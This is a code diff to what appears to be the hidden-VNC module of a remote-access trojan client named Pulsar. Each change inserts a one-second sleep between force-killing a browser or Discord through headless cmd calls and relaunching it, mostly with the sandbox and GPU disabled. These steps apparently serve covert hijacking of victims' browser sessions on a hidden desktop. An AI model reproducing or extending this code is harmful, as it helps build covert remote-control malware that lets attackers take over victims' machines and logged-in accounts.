@@ -128,6 +128,7 @@ namespace Pulsar.Client.Helper.HVNC
             //}
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
             this.CreateProc(killCommand);
+            Thread.Sleep(1000);
             string filePath2 = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote";
             this.CreateProc(filePath2);
         }
@@ -166,6 +167,7 @@ namespace Pulsar.Client.Helper.HVNC
 
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
             this.CreateProc(killCommand);
+            Thread.Sleep(1000);
             string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
             this.CreateProc(startCommand);
         }
@@ -191,6 +193,7 @@ namespace Pulsar.Client.Helper.HVNC
 
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
             this.CreateProc(killCommand);
+            Thread.Sleep(1000);
             string startCommand = "Conhost --headless cmd.exe /c start opera.exe";
             this.CreateProc(startCommand);
         }
@@ -216,6 +219,7 @@ namespace Pulsar.Client.Helper.HVNC
 
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
             this.CreateProc(killCommand);
+            Thread.Sleep(1000);
             string startCommand = "Conhost --headless cmd.exe /c start operagx.exe";
             this.CreateProc(startCommand);
         }
@@ -251,6 +255,7 @@ namespace Pulsar.Client.Helper.HVNC
             //}
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
             this.CreateProc(killCommand);
+            Thread.Sleep(1000);
             string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
             this.CreateProc(filePath2);
         }
@@ -282,6 +287,7 @@ namespace Pulsar.Client.Helper.HVNC
                 //}
                 string killCommand = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                 this.CreateProc(killCommand);
+                Thread.Sleep(1000);
                 string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11";
                 this.CreateProc(filePath2);
             }
@@ -301,7 +307,7 @@ namespace Pulsar.Client.Helper.HVNC
 
             string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
             this.CreateProc(killCommand);
-
+            Thread.Sleep(1000);
             string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
             this.CreateProc(startCommand);
         }
